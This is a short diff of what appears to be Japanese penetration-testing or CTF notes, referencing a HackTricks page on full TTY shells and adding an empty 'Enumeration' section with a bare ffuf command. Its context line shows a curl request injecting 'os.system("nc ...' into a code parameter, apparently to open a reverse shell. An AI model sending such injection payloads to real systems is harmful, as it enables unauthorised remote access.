@@ -8,3 +8,10 @@ curl -i http://192.168.243.117:50000/verify -X POST --data 'code=os.system("nc 1
 ```
 ※参考サイト
 [https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys);
+
+---
+## ## Enumeration
+### ### wordbruteforce
+```sh
+ffuf 
+```
